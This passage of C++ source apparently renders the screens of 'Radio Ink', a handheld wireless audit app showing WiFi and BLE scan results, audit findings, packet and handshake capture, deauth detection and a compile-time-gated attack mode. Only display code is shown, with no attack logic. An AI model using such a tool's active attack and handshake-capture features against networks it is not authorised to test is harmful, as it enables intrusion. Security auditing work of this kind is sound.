  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  if (locating) {
    renderLocator();
    return;
  }

  if (state == State::CAPTURING) {
    if (captureMode == CaptureMode::Pcap) renderCapture();
    else if (captureMode == CaptureMode::DeauthDetect) renderDeauthDetect();
    else renderHandshake();
    return;
  }

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  if (state == State::ATTACKING) {
    renderAttack();
    return;
  }
#endif

  if (showingCameraList) {
    renderCameraList();
    return;
  }

  if (showingTarget) {
    if (targetMenuOpen) {
      renderTargetMenu();
      return;
    }
    const int itemCount = static_cast<int>(targetLines.size());
    GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                   targetTitle.c_str(), status.c_str());

    if (itemCount == 0) {
      const auto height = renderer.getLineHeight(UI_10_FONT_ID);
      const auto top = contentTop + (pageHeight - contentTop - metrics.buttonHintsHeight - height) / 2;
      UITheme::drawCenteredText(renderer, Rect{0, contentTop, pageWidth, pageHeight - contentTop}, UI_10_FONT_ID, top,
                                "No data");
    } else {
      const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
      GUI.drawList(
          renderer, Rect{0, contentTop, pageWidth, listHeight}, itemCount, targetScroll,
          [this](int index) { return targetLines[index]; }, nullptr, nullptr,
          [this](int index) { return std::to_string(index + 1) + "/" + std::to_string(targetLines.size()); });
    }

    // Deep-scan detail (WiFi or BLE) opens an action menu; other views just close.
    const char* confirmLabel = targetLocatable ? "Actions" : "Back";
    const auto labels = mappedInput.mapLabels("Back", confirmLabel, "Up", "Down");
    UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  if (showingDetails || showingFindings) {
    const bool bleMode = showingBleDetails;
    const int itemCount =
        showingFindings ? static_cast<int>(auditFindings.size())
                        : (bleMode ? static_cast<int>(bleFindings.size()) : static_cast<int>(wifiFindings.size()));
    GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                   showingFindings ? "Audit Findings" : (bleMode ? "BLE Results" : "WiFi Results"), status.c_str());

    if (itemCount == 0) {
      const auto height = renderer.getLineHeight(UI_10_FONT_ID);
      const auto top = contentTop + (pageHeight - contentTop - metrics.buttonHintsHeight - height) / 2;
      UITheme::drawCenteredText(renderer, Rect{0, contentTop, pageWidth, pageHeight - contentTop}, UI_10_FONT_ID, top,
                                "No results");
    } else {
      const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
      GUI.drawList(
          renderer, Rect{0, contentTop, pageWidth, listHeight}, itemCount, selectedFinding,
          [this, bleMode](int index) {
            if (showingFindings) {
              const auto& f = auditFindings[index];
              return f.severity + "  " + f.title;
            }
            if (bleMode) {
              const auto& b = bleFindings[index];
              if (!b.name.empty()) return b.name;
              return b.address;
            }
            const auto& w = wifiFindings[index];
            const std::string name = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
            return (w.marked ? std::string("[*] ") : std::string()) + name;
          },
          [this, bleMode](int index) {
            if (showingFindings) {
              return auditFindings[index].detail;
            }
            if (bleMode) {
              const auto& b = bleFindings[index];
              const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
              std::string out = advType.empty() ? b.address : (advType + "  " + std::to_string(b.rssi) + " dBm");
              if (advType.empty()) out += "  " + std::to_string(b.rssi) + " dBm";
              if (b.seenCount > 1 || deepScanMode) {
                out += "  seen " + std::to_string(b.seenCount) + "/" + std::to_string(scanTotalPasses);
              }
              if (b.hasTxPower) out += " TX " + std::to_string(b.txPower);
              return out;
            }
            const auto& w = wifiFindings[index];
            std::string out = w.bssid + "  " + std::to_string(w.rssi) + " dBm  CH" + std::to_string(w.channel) +
                              "  " + w.auth;
            if (w.seenCount > 1 || deepScanMode) {
              out += "  seen " + std::to_string(w.seenCount) + "/" + std::to_string(scanTotalPasses);
            }
            return out;
          },
          nullptr,
          [this, bleMode](int index) {
            if (showingFindings) return std::to_string(index + 1) + "/" + std::to_string(auditFindings.size());
            if (bleMode) return std::to_string(index + 1) + "/" + std::to_string(bleFindings.size());
            return std::to_string(index + 1) + "/" + std::to_string(wifiFindings.size());
          });
    }

    const bool findingHasTarget =
        showingFindings && selectedFinding < static_cast<int>(auditFindings.size()) &&
        (auditFindings[selectedFinding].wifiIndex >= 0 || auditFindings[selectedFinding].bleIndex >= 0);
    const char* selectLabel = showingFindings ? (findingHasTarget ? "Deep Scan" : "Close") : "Deep Scan";
    const auto labels = mappedInput.mapLabels("Back", selectLabel, "Up", "Down");
    UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  const String headerTitle = currentCategory < 0
                                 ? String("Radio Ink")
                                 : String("Radio Ink  \xC2\xBB  ") + ACTION_CATEGORIES[currentCategory].name;
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, headerTitle.c_str(),
                 status.c_str());

  int y = contentTop;
  // Sub-header counts strip.
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("APs ") + wifiFindings.size() + "   BLE " + bleFindings.size() + "   Probes " +
                     probeFindings.size())
                        .c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    (String("Mode: ") + (deepScanMode ? "Deep" : "Quick") + "  Passes: " + scanTotalPasses).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  if (!scanTime.empty()) {
    renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Last scan: ") + scanTime.c_str()).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  const String risk = makeRiskSummary();
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, risk.c_str(), pageWidth - summaryX * 2).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;

  if (!wifiFindings.empty()) {
    const auto& w = wifiFindings[0];
    const String strongest = String("Strongest: ") + (w.ssid.empty() ? "<hidden>" : w.ssid.c_str());
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      renderer.truncatedText(SMALL_FONT_ID, strongest.c_str(), pageWidth - summaryX * 2).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 4;
    const String details = String("avg ") + w.rssi + " dBm, CH" + w.channel + ", " + w.auth.c_str() + ", seen " +
                           w.seenCount + "/" + scanTotalPasses;
    renderer.drawText(SMALL_FONT_ID, summaryX, y, details.c_str());
  }

  constexpr int visibleActionRows = 4;
  const int listHeight = metrics.menuRowHeight * visibleActionRows;
  const int listTop = pageHeight - metrics.buttonHintsHeight - metrics.verticalSpacing - listHeight;
  // List reserves a gutter on the right for the skull mark.
  const int listWidth = pageWidth - RADIOINK_SKULL_WIDTH - summaryX;
  const Rect listRect{0, listTop, listWidth, listHeight};
  if (currentCategory < 0) {
    // Top-level category list.
    GUI.drawList(renderer, listRect, CATEGORY_COUNT, selectedCategory,
                 [](int index) { return std::string(ACTION_CATEGORIES[index].name); }, nullptr,
                 [](int index) { return ACTION_CATEGORIES[index].icon; });
  } else {
    // Items within the selected category.
    const ActionCategory& cat = ACTION_CATEGORIES[currentCategory];
    GUI.drawList(renderer, listRect, cat.count, selectedItem,
                 [&cat](int index) { return std::string(actionLabel(cat.items[index])); }, nullptr,
                 [&cat](int index) { return actionIcon(cat.items[index]); });
  }

  // The list reserves a right gutter (listWidth) for the skull mark, which the
  // Radio Ink theme stamps in drawButtonHints — no logo suppression here.
  const char* backLabel = currentCategory < 0 ? "Home" : "Back";
  const auto labels = mappedInput.mapLabels(backLabel, "Select", "Up", "Down");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
